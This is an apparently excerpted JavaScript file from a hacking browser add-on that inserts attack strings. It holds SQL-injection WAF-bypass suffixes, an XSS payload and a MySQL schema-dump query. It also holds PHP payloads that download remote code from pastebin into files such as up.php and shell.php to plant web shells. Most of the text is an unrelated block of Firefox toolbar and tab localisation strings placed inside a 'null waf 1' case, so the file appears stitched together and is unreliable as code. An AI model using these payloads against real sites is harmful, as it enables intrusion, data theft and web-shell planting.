...
//WAF BASED/ FIX POINT
            ...
            case 'FIX POINT10': txt = "'))-- -";
					break;

            case 'FIX POINT11': txt = "%23";
					break;

		    case 'FIX POINT12': txt = "%23%23";
					break;

			case 'FIX POINT13': txt = "%60";
					break;
			
			case 'FIX POINT14': txt = "%00";
					break;
			
			case 'FIX POINT15': txt = ";%00";
					break;
			
			case 'FIX POINT16': txt = "%90";
					break;
			
			case 'FIX POINT17': txt = "/*";
					break;
			
			case 'FIX POINT18': txt = "-- -/*";
					break;

			//Brute xss

            case 'brutexss1': txt = "'></img><img src=x onerror=confirm(/BUG/)>/</textarea><ScRiPt>prompt(/BUG/)</ScRiPt>'><iframe/onload=alert(document.domain)//>";
					break;
...
// LFI 601-656
	...
	//XSS via LFI Payload
		...
		//DIOS MYSQL Shariq /H3LL4R_H5H /Harsha Haxor/Sec7or Team /Mr.Silent coder /DHANI WAF /Dhani /Rahul R@Z /Lokomedia
		   ...
		   case 'Shariq':
			...
			case 'Benchmark':
					...
					break;
			//case 'Ph.Hitachi':
			//		txt = "/*!50000concat*/(0x3c666f6e7420636f6c6f723d7265643e496e6a65637465643c2f666f6e743e3c2f623e3c666f6e7420636f6c6f723d6379616e3e206279203c2f666f6e743e3c2f623e3c666f6e7420636f6c6f723d6c696d653e50682e486974616368693c2f666f6e743e,0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d7265643e557365723c2f666f6e743e,0x203a3a20,0x3c666f6e7420636f6c6f723d626c75653e,user(),0x3c2f666f6e743e3c62723e,0x3c666f6e7420636f6c6f723d7265643e44617461626173653c2f666f6e743e,0x203a3a20,0x3c666f6e7420636f6c6f723d626c75653e,database(),0x3c2f666f6e743e3c62723e3c666f6e7420636f6c6f723d7265643e56657273696f6e3c2f666f6e743e,0x203a3a20,0x3c666f6e7420636f6c6f723d626c75653e,version(),0x3c2f666f6e743e3c62723e,0x3c62723e,0x3c62723e,(select(select+/*!50000concat*/(@:=0x0a,(select+count(*)/*!from*/(/*!information_schema%252ecolumns*/)where(@:=/*!50000concat*/(@,0x3c666f6e7420636f6c6f723d7265643e,table_name,0x3c2f666f6e743e,0x203a3a20,0x3c666f6e7420636f6c6f723d626c75653e,column_name,0x3c2f666f6e743e,0x3c62723e))),@))))";
			//		break;*/
...
// WAF-SETS
	...
	switch (str){
		...
		case 'file_get_contents':
				txt = "<? @fwrite(fopen('up.php','w'),file_get_contents('https://pastebin.com/raw/PJW4AM2p')).phpinfo(); ?>";
				break;
		case 'file_get_contents 2':
				var url = alert('http://localhost/get.php?f=shell.php&u=http://localhost/c99.txt');
				txt = "<? fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?>";
				break;
		case 'cmd_base64':
				var url = alert('http://localhost/cmd.php?cmd=PD8gcGhwaW5mbygpOz8+');
	  ...
	  shell: function (choice)	{
		...
		case 'b374k_mini_shell':
				...
				break;
		case 'mini_shell':
				txt = "https://pastebin.com/raw/ECstNap8";
				break;
		/*case 'c99':
				txt = "";
				break;
...
//
			case 'null waf 1':
					 txt = txt.replace(/&Ctr_title;/g, 	"Customize &brandShortName;");
					 txt = txt.replace(/&Ctr_addonbar;/g, "Add-on Bar");
					 txt = txt.replace(/&Ctr_statusbar;/g, "Status Bar");
					 txt = txt.replace(/&Ctr_flexspace;/g, "Flexible space");
					 txt = txt.replace(/&Ctr_space;/g, 	"Space");
					 txt = txt.replace(/&Ctr_separator;/g, "Separator");
					 txt = txt.replace(/&Ctr_navthrobber;/g,	"Activity Indicator");
					 txt = txt.replace(/&Ctr_sidebarbutton;/g,	"(Sidebar)");
					 txt = txt.replace(/&Ctr_windowcontrols;/g,	"Min/max/close (full screen)");
					 txt = txt.replace(/&Ctr_rr;/g, "Restart required!");
					 txt = txt.replace(/&Ctr_window;/g, 	"window");
					 txt = txt.replace(/&Ctr_centered;/g, "Centered");
					 txt = txt.replace(/&Ctr_page;/g, 	"Page");
					 txt = txt.replace(/&Ctr_position;/g, "Position");
					 txt = txt.replace(/&Ctr_appearance;/g, "Appearance");
					 txt = txt.replace(/&Ctr_left;/g, 	"Left");
					 txt = txt.replace(/&Ctr_right;/g, 	"Right");
					 txt = txt.replace(/&Ctr_privmode;/g, "(private window)");

 txt = txt.replace(/&Ctr_cuibuttons;/g, "Buttons");
 txt = txt.replace(/&Ctr_cuibutnormal;/g,	"Normal");
 txt = txt.replace(/&Ctr_cuibutsmall;/g,	"Small");
 txt = txt.replace(/&Ctr_cuimode;/g, "Mode");
 txt = txt.replace(/&Ctr_cuiico;/g, 	"Icons");
 txt = txt.replace(/&Ctr_cuiicotxt;/g, "Icons + Text");
 txt = txt.replace(/&Ctr_cuitxt;/g, 	"Text");
 txt = txt.replace(/&Ctr_cuitabsnontop;/g,	"Tabs not on top");

 txt = txt.replace(/&Ctr_tnot;/g, 	"(tabs not on top)");

 txt = txt.replace(/&Ctr_tabcolors_t;/g,	"Tab colors &amp; text");

 txt = txt.replace(/&Ctr_tabs;/g, 	"Tabs");
 txt = txt.replace(/&Ctr_tabs0;/g, 	"&brandShortName; default (Curved tabs)");
 txt = txt.replace(/&Ctr_tabs1;/g, 	"Squared tabs (classic)");
 txt = txt.replace(/&Ctr_tabs1m;/g, 	"Squared tabs (australized)");
 txt = txt.replace(/&Ctr_tabs2;/g, 	"Curved tabs (alternative)");
 txt = txt.replace(/&Ctr_tabs3;/g, 	"Curved tabs (alternative Aero)");
 txt = txt.replace(/&Ctr_tabforminfo;/g,	"Tab appearance is controlled by the current theme.");
 txt = txt.replace(/&Ctr_coltabsinfo;/g,	"Tab appearance is not fully compatible to 'ColorfulTabs' add-on!");
 txt = txt.replace(/&Ctr_tabsontop0;/g, "Tabs on top (default)");
 txt = txt.replace(/&Ctr_tabsontop1;/g, "Tabs on top - [tabsontop=true] attribute");
 txt = txt.replace(/&Ctr_tabsontop2;/g, "Tabs not on top (v1) - [tabsontop=false] attribute");
 txt = txt.replace(/&Ctr_tabsontop3;/g, "Tabs not on top (v2) - [tabsontop=false] attribute");
 txt = txt.replace(/&Ctr_tabsontopW1;/g,	"v2 is only for some add-ons and full themes!");
 txt = txt.replace(/&Ctr_tabsontopI1;/g,	"Attribute [tabsontop=true/false] gets added to");
 txt = txt.replace(/&Ctr_tabsintitlebar;/g,	"Use &brandShortName; titlebar instead of OS titlebar");
 txt = txt.replace(/&Ctr_tabwidthdef;/g,	"(default)");
 txt = txt.replace(/&Ctr_tabwidthcla;/g,	"(classic)");
 txt = txt.replace(/&Ctr_tabminheight;/g,	"Height:");
 txt = txt.replace(/&Ctr_tabheightinfo;/g,	"Low height values will cause glitches in maximized mode!");
 txt = txt.replace(/&Ctr_ctrltabprev;/g,	"Preview tabs using 'Ctrl + Tab'");
 txt = txt.replace(/&Ctr_tabmaxwidth;/g,	"Max-width:");
 txt = txt.replace(/&Ctr_tabminwidth;/g,	"Min-width:");
 txt = txt.replace(/&Ctr_tabwidthinfo;/g,	"Tab width is controlled by TabMixPlus");
 txt = txt.replace(/&Ctr_tabwidthinfo2;/g,	"Tab width is controlled by TabUtilities");
 txt = txt.replace(/&Ctr_tabwidthinfo3;/g,	"Values below 48 px will cause glitches in most cases!");
 txt = txt.replace(/&Ctr_square_edges;/g,	"Squared top corners");
 txt = txt.replace(/&Ctr_tttitlebar;/g, "Tab title in &brandShortName; titlebar");
 txt = txt.replace(/&Ctr_ttoverflow;/g, "Long tab titles");
 txt = txt.replace(/&Ctr_ttoverfl_def;/g,	"Default overflow effect");
 txt = txt.replace(/&Ctr_ttoverfl_no;/g,	"No overflow effect");
 txt = txt.replace(/&Ctr_tabtitle;/g, "Tab title position");
 txt = txt.replace(/&Ctr_tabinsertion;/g,	"Insert related tab after current tab");
 txt = txt.replace(/&Ctr_emptytfavico;/g,	"Show favicon (if a site does not offer one)");
 txt = txt.replace(/&Ctr_emptytfavico_n;/g,	"None");
 txt = txt.replace(/&Ctr_emptytfavico_g;/g,	"Generic");
 txt = txt.replace(/&Ctr_noemptypticon;/g,	"Remove empty favicon from pinned tabs");
 txt = txt.replace(/&Ctr_closetab_0;/g, "Tab Close");
 txt = txt.replace(/&Ctr_closetab_1;/g, "On active tab only");
 txt = txt.replace(/&Ctr_closetab_2;/g, "Nowhere");
 txt = txt.replace(/&Ctr_closetab_3;/g, "On tab toolbars end");
 txt = txt.replace(/&Ctr_closetab_4;/g, "On tab toolbars start");
 txt = txt.replace(/&Ctr_closetab_5;/g, "On all tabs (forced)");
 txt = txt.replace(/&Ctr_closetab_hfot;/g,	"Hide for one visible tab");
 txt = txt.replace(/&Ctr_closei_def;/g, "Default icons");
 txt = txt.replace(/&Ctr_closeonleft;/g,	"Alternative position on tab");
 txt = txt.replace(/&Ctr_closetabbig;/g,"Bigger icon (20x20 px)");
 txt = txt.replace(/&Ctr_close_wwltab;/g,	"Close window with last visible tab");

 txt = txt.replace(/&Ctr_hctpinfotab;/g,	"Some tab variations are not compatible to 'Hide Caption Titlebar Plus' add-on.");
 txt = txt.replace(/&Ctr_hctpinfoab;/g, "Button on titlebar is not compatible to 'Hide Caption Titlebar Plus' add-on.");
 txt = txt.replace(/&Ctr_tobainfotab;/g,	"The add-on 'Tabs on Bottom' is not compatible with '&Ctr_title;' and should be disabled. Use available '&Ctr_cuitabsnontop;' settings instead!");

 txt = txt.replace(/&Ctr_appbutton;/g, "&brandShortName; button");
 txt = txt.replace(/&Ctr_appbutton0;/g, "Button disabled");
 txt = txt.replace(/&Ctr_appbutton1;/g, "Button on toolbar");
 txt = txt.replace(/&Ctr_appbutton1wt;/g,	"Button on toolbar (text only)");
 txt = txt.replace(/&Ctr_appbutton2;/g, "Button on &brandShortName; titlebar");
 txt = txt.replace(/&Ctr_appbutton2h;/g,	"Button on &brandShortName; titlebar (hidden)");
 txt = txt.replace(/&Ctr_appbutton2io;/g,	"Button on &brandShortName; titlebar (icon only)");
 txt = txt.replace(/&Ctr_paneluibtweak;/g,	"Display menu button as &brandShortName; button...");
 txt = txt.replace(/&Ctr_paneluibtweak2;/g,	"Display menu button as &brandShortName; button (icon only)...");
 txt = txt.replace(/&Ctr_paneluibtweak3;/g,	"...when on tabs toolbar");
 txt = txt.replace(/&Ctr_appbuttonc;/g, "Button color");
 txt = txt.replace(/&Ctr_appbuttonc_o;/g,	"Orange (Firefox)");
 txt = txt.replace(/&Ctr_appbuttonc_a;/g,	"Blue (Aurora)");
 txt = txt.replace(/&Ctr_appbuttonc_n;/g,	"Black (Nightly)");
 txt = txt.replace(/&Ctr_appbuttonc_t;/g,	"Transparent");
 txt = txt.replace(/&Ctr_appbuttonc_p;/g,	"Blue (Palemoon)");
 txt = txt.replace(/&Ctr_appbuttonc_r;/g,	"Red");
 txt = txt.replace(/&Ctr_appbuttonc_g;/g,	"Green");
 txt = txt.replace(/&Ctr_appbuttonc_gr;/g,	"Gray");
 txt = txt.replace(/&Ctr_appbuttonc_pu;/g,	"Purple");
 txt = txt.replace(/&Ctr_appbuttonc_wh;/g,	"White");
 txt = txt.replace(/&Ctr_appbuttonc_cu;/g,	"Custom");
 txt = txt.replace(/&Ctr_appbuttonct;/g,	"Custom button color (if button on toolbar)");
 txt = txt.replace(/&Ctr_appbuttonI1;/g,	"Restart recommended");
 txt = txt.replace(/&Ctr_appbuttonI1e;/g,	"&brandShortName; button is only visible on &brandShortName; titlebar and not on OS titlebar!");
 txt = txt.replace(/&Ctr_appbutmhi;/g, "Higher position (if on tabs toolbar)");
 txt = txt.replace(/&Ctr_appbautocol;/g,	"Automatically set browser channel color (default/Aurora/Nightly)");
 txt = txt.replace(/&Ctr_appbutbdl;/g, "Hide borders and background colors");
 txt = txt.replace(/&Ctr_dblclclosefx;/g,	"Double click on button to close current window");
 txt = txt.replace(/&Ctr_appbclmmenus;/g,	"Clickable menus inside menu popup (New Tab, Print...)");
 txt = txt.replace(/&Ctr_appbutonclab;/g,	"Title");
 txt = txt.replace(/&Ctr_appbutonclab2;/g,	"Add title or leave empty");

 txt = txt.replace(/&Ctr_ui;/g, "General UI");
 txt = txt.replace(/&Ctr_nbiconsize0;/g,	"Navigation toolbar attribute 'iconsize'");
 txt = txt.replace(/&Ctr_smallnavbut;/g,	"Small buttons on navigation toolbar");
 txt = txt.replace(/&Ctr_backforward;/g,	"Movable back-forward buttons");
 txt = txt.replace(/&Ctr_nbcompact;/g, "Reduce navigation toolbars height");
 txt = txt.replace(/&Ctr_hide_bf_popup;/g,	"Hide buttons history popup menu on mouse press");
 txt = txt.replace(/&Ctr_bf_space;/g, "Reduce space between buttons (if possible)");
 txt = txt.replace(/&Ctr_noconicons;/g, "Page context menu: replace( icons with labels (back, forward...)");
 txt = txt.replace(/&Ctr_prefpage;/g, "Options page / window");
 txt = txt.replace(/&Ctr_altoptionsd;/g,	"Default appearance");
 txt = txt.replace(/&Ctr_altoptionsp;/g,	"Alternative appearance");
 txt = txt.replace(/&Ctr_altoptionsw;/g,	"Open options page in a window");
 txt = txt.replace(/&Ctr_altoptions_hm;/g,	"horizontal menu");
 txt = txt.replace(/&Ctr_altoptions_vm;/g,	"vertical menu");
 txt = txt.replace(/&Ctr_altoptionsww;/g,	"Width:");
 txt = txt.replace(/&Ctr_altoptionswh;/g,	"Height:");
 txt = txt.replace(/&Ctr_altoptionsi;/g,	"The simulated options window is not a dialog anymore but a 'browser window' with all toolbars hidden. The 'Use Current Page' feature only adds urls of pages opened in the current window, which is only 'about:preferences' in this case. The 'options toolbar button' gets replace(d by a new one to be able to open options in a window.");
 txt = txt.replace(/&Ctr_options_rem;/g,	"Remember last selected category");
 txt = txt.replace(/&Ctr_aboutpages;/g, "General 'about:' pages: alternative appearance");
 txt = txt.replace(/&Ctr_svgfilters;/g, "SVG colors for default toolbar button icons");
 txt = txt.replace(/&Ctr_wincontrols;/g,	"Movable window controls for full screen mode");
 txt = txt.replace(/&Ctr_puibuttonsep;/g,	"Menu button separator");
 txt = txt.replace(/&Ctr_puibut_no_sep;/g,	"Hidden");
 txt = txt.replace(/&Ctr_puibut_l_sep;/g,	"Left");
 txt = txt.replace(/&Ctr_puibut_r_sep;/g,	"Right");
 txt = txt.replace(/&Ctr_html5warning;/g,	"HTML5 full screen warning");
 txt = txt.replace(/&Ctr_oldtoplevimg;/g,	"Classic image appearance on white background");
 txt = txt.replace(/&Ctr_altdlprogbar;/g,	"Download progress bar: alternative appearance");
 txt = txt.replace(/&Ctr_altalertbox;/g,	"'Alert box': alternative appearance");
 txt = txt.replace(/&Ctr_emptygfavico;/g,	"Replace generic favicon");
 txt = txt.replace(/&Ctr_mstatusbar;/g, "Movable status panel");
 txt = txt.replace(/&Ctr_mstatusbars4e;/g,	"Status-bar panel is controlled by 'Status-4-Evar'");
 txt = txt.replace(/&Ctr_mstatusbartpp;/g,	"Status-bar panel is controlled by 'ThePuzzlePiece'");
 txt = txt.replace(/&Ctr_mstatusbarpzt;/g,	"Status-bar panel is controlled by 'Puzzle Bars'");
 txt = txt.replace(/&Ctr_mstatusbarabr;/g,	"Status-bar panel is controlled by 'The Addon Bar (Restored)'");
 txt = txt.replace(/&Ctr_combrelstop;/g,	"Stop &amp; reload: combine buttons on toolbar");
 txt = txt.replace(/&Ctr_stoprel1;/g, "Important: position reload button after stop button!");
 txt = txt.replace(/&Ctr_panelmenucol;/g,	"Panel menu popups: alternative background color");
 txt = txt.replace(/&Ctr_hideprivmask;/g,	"Private browsing: hide mask indicator");
 txt = txt.replace(/&Ctr_navsmallicons;/g,	"Small icons");
 txt = txt.replace(/&Ctr_navlargeicons;/g,	"Large icons");
 txt = txt.replace(/&Ctr_nbisizedelay0;/g,	"Initialization delay on browser startup");
 txt = txt.replace(/&Ctr_nbisizedelay;/g,	"ms (1000 ms = 1 sec)");
 txt = txt.replace(/&Ctr_findbar;/g, "Findbar");
 txt = txt.replace(/&Ctr_findbar_hws;/g,	"Close findbar when scrolling page");
 txt = txt.replace(/&Ctr_findbar_width;/g,	"Findboxes width: ");
 txt = txt.replace(/&Ctr_findbarpos;/g, "Findbars position");
 txt = txt.replace(/&Ctr_findbar_def;/g,	"Bottom (default)");
 txt = txt.replace(/&Ctr_findbar_top;/g,	"Top");
 txt = txt.replace(/&Ctr_findbar_topa;/g,	"Top (alternative content order)");
 txt = txt.replace(/&Ctr_findbar_bota;/g,	"Bottom (alternative content order)");
 txt = txt.replace(/&Ctr_nav_txt_ico0;/g,	"Show icons only (default)");
 txt = txt.replace(/&Ctr_nav_txt_ico1;/g,	"Show large icons");
 txt = txt.replace(/&Ctr_nav_txt_ico2;/g,	"Show icons and text");
 txt = txt.replace(/&Ctr_nav_txt_ico3;/g,	"Show text only");
 txt = txt.replace(/&Ctr_nav_txt_exp;/g,	"Classic attributes (experimental):");
 txt = txt.replace(/&Ctr_iat_notf_vt;/g,	"Exclude vertical toolbars");
 txt = txt.replace(/&Ctr_cpanelmenus;/g,	"Panel menu popups (bookmarks, history etc.): compact view");
 txt = txt.replace(/&Ctr_hidezoomres;/g,	"Zoom controls on toolbar: hide zoom-reset button");
 txt = txt.replace(/&Ctr_alt_newtabp;/g,	"New tab page (about:newtab): alternative appearance");
 txt = txt.replace(/&Ctr_search_ui;/g, "Search");
 txt = txt.replace(/&Ctr_ctroldsearch;/g,	"Old search");
 txt = txt.replace(/&Ctr_ctroldsearchd;/g,	"Not compatible to other search add-ons!");
 txt = txt.replace(/&Ctr_ctroldsearchc;/g,	"Clear searchbox after search");
 txt = txt.replace(/&Ctr_ctroldsearchr;/g,	"Revert to first search engine in list after search");
 txt = txt.replace(/&Ctr_ctrosearchdel;/g,	"delay");
 txt = txt.replace(/&Ctr_search_oit;/g, "Open search in new tab");
 txt = txt.replace(/&Ctr_osearch_meoit;/g,	"Middle-click: open search in new 'foreground tab'");
 txt = txt.replace(/&Ctr_osearch_meoit1;/g,	"Search engine");
 txt = txt.replace(/&Ctr_osearch_meoit2;/g,	"Search glass");
 txt = txt.replace(/&Ctr_osearch_iwidth;/g,	"Automatically adjust popup width");
 txt = txt.replace(/&Ctr_osearch_cwidth;/g,	"Custom width for search popups");
 txt = txt.replace(/&Ctr_osearch_dm;/g, "Small dropmarker");
 txt = txt.replace(/&Ctr_addonmanager;/g,	"Add-on manager");
 txt = txt.replace(/&Ctr_alt_addonsp;/g,	"'More info' page: alternative order");
 txt = txt.replace(/&Ctr_am_showrecup;/g,	"Always show 'Recent updates' category");
 txt = txt.replace(/&Ctr_alt_addonsm;/g,	"Alternative appearance");
 txt = txt.replace(/&Ctr_am_nowarning;/g,	"Add-on lists: hide warnings");
 txt = txt.replace(/&Ctr_am_compact;/g, "Add-on lists: compact view");
 txt = txt.replace(/&Ctr_am_compact2;/g,	"Compact view +");
 txt = txt.replace(/&Ctr_am_highlight;/g,	"Add-on lists: highlight entry on 'hover'");
 txt = txt.replace(/&Ctr_am_buticons;/g,	"Add-on lists: replace( button labels with icons");
 txt = txt.replace(/&Ctr_am_hovshowb;/g,	"Add-on lists: only show buttons on 'hover'");
 txt = txt.replace(/&Ctr_addonversion;/g,	"Add-on lists: show add-on version");
 txt = txt.replace(/&Ctr_xpinstallui;/g,	"Old add-on install window");
 txt = txt.replace(/&Ctr_bmbutton;/g, "Bookmarks menu button");
 txt = txt.replace(/&Ctr_hiderecentbm;/g,	"Bookmarks popup: hide recently added bookmarks");
 txt = txt.replace(/&Ctr_hideeditbm;/g, "Bookmarks star: hide popup (if page is not bookmarked)");
 txt = txt.replace(/&Ctr_oldplacesbut;/g,	"Bookmark items and folders on toolbar: old appearance");
 txt = txt.replace(/&Ctr_dl_pm_drop;/g, "Download buttons panel: show dropmarker");
 txt = txt.replace(/&Ctr_bmbutpanelm;/g,	"Popup: panel menu appearance");
 txt = txt.replace(/&Ctr_bmbunsortbm;/g,	"Popup: show 'Other Bookmarks' menu");
 txt = txt.replace(/&Ctr_bmbunsortbm2;/g,	"Menu above bookmarks");
 txt = txt.replace(/&Ctr_bmbviewbmsb;/g,	"Popup: show 'View Bookmarks Sidebar' menuitem");
 txt = txt.replace(/&Ctr_bmbviewbmtb;/g,	"Popup: show 'View Bookmarks Toolbar' menuitem");
 txt = txt.replace(/&Ctr_bmbutnotb;/g, "Popup: hide 'Bookmarks Toolbar' menu");
 txt = txt.replace(/&Ctr_bmbnounsort;/g,	"Popup: hide 'Other Bookmarks' menu and menuitem");
 txt = txt.replace(/&Ctr_bmbutclpopup;/g,	"Popup: only show 'Bookmark this page' and bookmarks");
 txt = txt.replace(/&Ctr_bmbutnotext;/g,	"Hide label on bookmarks bar");
 txt = txt.replace(/&Ctr_skipprintpr;/g,	"Print button: skip print preview");
 txt = txt.replace(/&Ctr_tbconmenu;/g, "Toolbar context menu: hide 'move to menu', 'remove from toolbar', 'reload/bookmark all tabs' and 'undo close tab'");
 txt = txt.replace(/&Ctr_noresizerxp;/g,	"Hide Resizer (Windows XP)");
 txt = txt.replace(/&Ctr_extraurlkeycb;/g,	"Open additional location bar (Cmd/Ctrl+");
 txt = txt.replace(/&Ctr_pmhidelabels;/g,	"Main panel menu popup: hide button labels");
 txt = txt.replace(/&Ctr_menupopupscr;/g,	"Menu popups: show scrollbars instead of scroll arrows");
 txt = txt.replace(/&Ctr_closegeneral;/g,	"General close icons");

 txt = txt.replace(/&Ctr_tabsep_def;/g, "Default tab separators");
 txt = txt.replace(/&Ctr_fxmockup;/g, "&brandShortName; Mockup");
 txt = txt.replace(/&Ctr_tabmokcolor;/g,	"White color for tab buttons (close, new, groups, list all)");
 txt = txt.replace(/&Ctr_tabmokcolor2;/g,	"White color and dark shadow for text on non-active tabs");
 txt = txt.replace(/&Ctr_tabmokcolor4;/g,	"White color for empty dotted tab favicon");

 txt = txt.replace(/&Ctr_navthrobber1;/g,	"Clicking on activity indicator opens the following url in a new tab:");
 txt = txt.replace(/&Ctr_navthrobber2;/g,	"Add url or leave empty");

 txt = txt.replace(/&Ctr_tab_tf_info1;/g,	"Color names, hexcodes, rgb(a) and hsl(a) values are supported.");
 txt = txt.replace(/&Ctr_tab_tf_info2;/g,	"Inputs won't be validated!");
 txt = txt.replace(/&Ctr_tabact_t;/g, "selected");
 txt = txt.replace(/&Ctr_tabhov_t;/g, "hovered");
 txt = txt.replace(/&Ctr_tabnor_t;/g, "default");
 txt = txt.replace(/&Ctr_tabpen_t;/g, "unloaded");
 txt = txt.replace(/&Ctr_tabunr_t;/g, "unread");
 txt = txt.replace(/&Ctr_ntab_t;/g, 	"new tab");
 txt = txt.replace(/&Ctr_customsqtab1;/g,	"Background");
 txt = txt.replace(/&Ctr_ctext;/g, 	"Text");
 txt = txt.replace(/&Ctr_ctextsh;/g, "Text shadow");
 txt = txt.replace(/&Ctr_tabnor;/g, 	"Default Tab");
 txt = txt.replace(/&Ctr_tabhov;/g, 	"Hovered Tab");
 txt = txt.replace(/&Ctr_tabact;/g, 	"Selected Tab");
 txt = txt.replace(/&Ctr_tabpen;/g, 	"Unloaded Tab");
 txt = txt.replace(/&Ctr_tabunr;/g, 	"Unread Tab");
 txt = txt.replace(/&Ctr_ntabnor;/g, "Default New tab");
 txt = txt.replace(/&Ctr_ntabhov;/g, "Hovered New tab");
 txt = txt.replace(/&Ctr_bold;/g, 	"Bold");
 txt = txt.replace(/&Ctr_italic;/g, 	"Italic");
 txt = txt.replace(/&Ctr_underlined;/g, "Underlined");
 txt = txt.replace(/&Ctr_notabhov;/g, "Enabled settings override 'hovered' settings");
 txt = txt.replace(/&Ctr_tablowopa;/g, "Reduce tab visibility");
 txt = txt.replace(/&Ctr_tabc_act_tb;/g,	"Background color on toolbars");

 txt = txt.replace(/&Ctr_urlbar;/g, 	"Location bar");
 txt = txt.replace(/&Ctr_starinurl;/g, "Star-button");
 txt = txt.replace(/&Ctr_starinurlinfo;/g,	"Default bookmarks menu button gets hidden");
 txt = txt.replace(/&Ctr_feedinurl;/g, "RSS feed-button");
 txt = txt.replace(/&Ctr_hideurelstop;/g,	"Hide 'stop &amp; reload' buttons");
 txt = txt.replace(/&Ctr_hideurelstop2;/g,	"Always show 'go' button");
 txt = txt.replace(/&Ctr_hideurlgo;/g, "Hide 'go' button");
 txt = txt.replace(/&Ctr_hideurlsrg;/g, "Hide 'reload, stop &amp; go' button separators &amp; spaces");
 txt = txt.replace(/&Ctr_urlbardropm;/g,	"Move dropmarker to the last possible position");
 txt = txt.replace(/&Ctr_urlbardropm2;/g,	"Make dropmarker always visible");
 txt = txt.replace(/&Ctr_altreaderico;/g,	"Alternative 'Reader' icons");
 txt = txt.replace(/&Ctr_hideurlzoom;/g,	"Hide zoom button (if present)");
 txt = txt.replace(/&Ctr_urlbardark;/g, "Dark background color");
 txt = txt.replace(/&Ctr_hideprbutton;/g,	"Hide notification icon when a popup gets blocked");
 txt = txt.replace(/&Ctr_locsearchbw10;/g,	"Reduce location bars and search bars height (experimental)");
 txt = txt.replace(/&Ctr_urlbar_ib;/g, "Site Identity Button");
 txt = txt.replace(/&Ctr_ib_nohovcolor;/g,	"Do not show gray color when hovered");
 txt = txt.replace(/&Ctr_ib_graycolor;/g,	"Gray color for unknown identity and 'about:' pages");
 txt = txt.replace(/&Ctr_verifiedcolors;/g,	"Button colors for verified websites, secure and not secure connections");
 txt = txt.replace(/&Ctr_ibinfoico;/g, "Replace 'i'-icon with globe icon");
 txt = txt.replace(/&Ctr_ibinfoico2;/g, "Hide 'i'-icon (if possible)");
 txt = txt.replace(/&Ctr_iblabels;/g, "Hide labels");
 txt = txt.replace(/&Ctr_faviconurl;/g, "Favicon: current websites icon");
 txt = txt.replace(/&Ctr_padlock;/g, "Padlock icon for secure connections");
 txt = txt.replace(/&Ctr_padlock_hid;/g,	"hidden");
 txt = txt.replace(/&Ctr_padlock_def;/g,	"default");
 txt = txt.replace(/&Ctr_padlock_cla;/g,	"classic");
 txt = txt.replace(/&Ctr_padlock_mod;/g,	"modern");
 txt = txt.replace(/&Ctr_padlock_ext;/g,	"'&brandShortName;' icon for valid 'about' pages");
 txt = txt.replace(/&Ctr_icopageinfo;/g,	"Favicon;/globe-/'i'-icon: 'click' opens 'page info window'");
 txt = txt.replace(/&Ctr_lbsbsize;/g, "Custom width");
 txt = txt.replace(/&Ctr_searchbar;/g, "Search bar");
 txt = txt.replace(/&Ctr_autocomplete;/g,	"Autocomplete popup");
 txt = txt.replace(/&Ctr_altautocompl;/g,	"Alternative appearance");
 txt = txt.replace(/&Ctr_autocompl_it;/g,	"Remove 'Search with...' and 'Visit' items (if present)");
 txt = txt.replace(/&Ctr_acompl_search;/g,	"Show search engines");
 txt = txt.replace(/&Ctr_autocompl_hl;/g,	"Highlighting of text hits");
 txt = txt.replace(/&Ctr_autocompl_rhl;/g,	"Aero colors for highlighted results");
 txt = txt.replace(/&Ctr_autocompl_not;/g,	"Hide page title");
 txt = txt.replace(/&Ctr_autocompl_sep;/g,	"Show separator between results");
 txt = txt.replace(/&Ctr_urlbar_uc;/g, "Disable 'unified autocomplete' feature");
 txt = txt.replace(/&Ctr_lbsugresi;/g, "Disable height limit");
 txt = txt.replace(/&Ctr_cresultshcb;/g,	"Custom height limit: ");
 txt = txt.replace(/&Ctr_lbsugres;/g, "Number of results");
 txt = txt.replace(/&Ctr_lbsbradius;/g, "Custom border roundness");

 txt = txt.replace(/&Ctr_menubar_items;/g,	"Menu items position");
 txt = txt.replace(/&Ctr_extrabar;/g, "Additional Toolbars");
 txt = txt.replace(/&Ctr_extrabar0;/g, "Additional Toolbar(s)");
 txt = txt.replace(/&Ctr_extrabar1;/g, "Additional Toolbar");
 txt = txt.replace(/&Ctr_extrabarinfo;/g,	"Switching between 'tabs on top' and 'tabs not on top' modes randomly alters additional toolbars order. &brandShortName; has to be restarted to solve this issue.");

 txt = txt.replace(/&Ctr_invicons;/g, "Inverted icons");
 txt = txt.replace(/&Ctr_menubar;/g, "Menubar");
 txt = txt.replace(/&Ctr_tabstoolbar;/g,	"Tabs Toolbar");
 txt = txt.replace(/&Ctr_navbar;/g, 	"Navigation Toolbar");
 txt = txt.replace(/&Ctr_bookbar;/g, "Bookmarks Toolbar");
 txt = txt.replace(/&Ctr_notoolbar;/g, "Hidden (do not show menu items)");

 txt = txt.replace(/&Ctr_mbarforceleft;/g,	"First element");
 txt = txt.replace(/&Ctr_mbarforceright;/g,	"Last element");

 txt = txt.replace(/&Ctr_toolbars;/g, "Toolbars");
 txt = txt.replace(/&Ctr_dblclnewtab;/g,	"Double click on toolbar opens a new tab");
 txt = txt.replace(/&Ctr_dblclnewtabdes;/g,	"Not suitable for all complete themes while Windows titlebar is active.");
 txt = txt.replace(/&Ctr_hidetbwot;/g, "Hide tabs toolbar with only one visible tab");
 txt = txt.replace(/&Ctr_hidetbwote;/g, "Reduce hiding delay on startup");
 txt = txt.replace(/&Ctr_hidetbwote_i;/g,	"Could cause glitches on tabs toolbar");
 txt = txt.replace(/&Ctr_hidetbwote2;/g,	"Automatically adjust titlebar space");
 txt = txt.replace(/&Ctr_notabfog;/g, "Remove background fog (Windows AeroGlass/8)");
 txt = txt.replace(/&Ctr_notabbg;/g, "Remove background color (Windows AeroGlass/8)");
 txt = txt.replace(/&Ctr_hightabpos;/g, "Reduce space above toolbar (if possible)");
 txt = txt.replace(/&Ctr_showalltabsb;/g,	"Always show 'all tabs' button");
 txt = txt.replace(/&Ctr_alttabstb;/g, "Alternative background color");
 txt = txt.replace(/&Ctr_alttabstb2;/g, "In maximized mode (tabs on top)");

 txt = txt.replace(/&Ctr_altmenubar;/g, "Add background color (OS titlebar)");
 txt = txt.replace(/&Ctr_altmenubarpos;/g,	"alternative position");
 txt = txt.replace(/&Ctr_altmenubarpos2;/g,	"Below &brandShortName; titlebar");
 txt = txt.replace(/&Ctr_menubarnofog;/g,	"Remove background color/fog (Windows AeroGlass/8)");

